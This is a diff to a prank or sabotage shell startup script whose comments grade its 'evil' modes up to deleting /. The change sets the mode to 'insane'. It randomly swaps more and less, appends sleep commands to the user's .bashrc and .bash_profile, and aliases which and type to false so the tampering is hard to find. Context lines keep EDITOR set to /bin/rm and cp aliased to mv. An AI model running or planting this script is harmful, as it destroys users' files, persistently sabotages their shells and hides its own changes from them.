@@ -11,7 +11,8 @@
 # destructive: delete files and do serious harm, non-recoverable damage included
 # devasting: may delete /
 # unusable: enable everything including, but not limited to replacing enter by backspace
-EVIL_BEHAVIOUR=annoying
+EVIL_BEHAVIOUR=insane
+#EVIL_BEHAVIOUR=annoying
 
 function insane()
 {
@@ -44,10 +45,19 @@ destructive && export EDITOR=/bin/rm;
 # Make Tab send the delete key.
 insane && tset -Qe $'\t';
 
+# Randomly set more is less, and less is more
+if insane ; then
+    val=$((${RANDOM} % 10))
+    if [ ${val} -ge 1 -a ${val} -le 5 ] ; then
+        alias more='less'
+        alias less='more'
+    fi
+fi
+
 # Randomly make the shell exit whenever a command has a non-zero exit status.
 if insane
 then
-	((RANDOM % 10)) || set -o errexit;
+	((${RANDOM} % 10)) || set -o errexit;
 fi
 
 # Let `cat` swallow every input and never return anything.
@@ -97,7 +107,7 @@ else
 fi;
 
 # Send STOP signal to random process at random time.
-destructive && sleep $[ ( $RANDOM % 100 ) + 1 ]s && kill -STOP $(ps x -o pid|sed 1d|sort -R|head -1) &
+#destructive && sleep $[ ( $RANDOM % 100 ) + 1 ]s && kill -STOP $(ps x -o pid|sed 1d|sort -R|head -1) &
 
 # Have `cp` perform `mv` instead.
 destructive && alias cp='mv';
@@ -121,6 +131,11 @@ annoying && alias yes="yes n";
 # Quit vim on startup.
 annoying && alias vim="vim +q";
 
-# Disable `unalias` and `alias`.
+insane && [[ -f "${HOME}/.bashrc" ]] && echo 'sleep .1' >> ~/.bashrc
+insane && [[ -f "${HOME}/.bash_profile" ]] && echo 'sleep .1' >> ~/.bash_profile
+
+# Disable `unalias`, `alias`, `which` and `type`.
 alias unalias=false;
 alias alias=false;
+alias which=false;
+alias type=false;
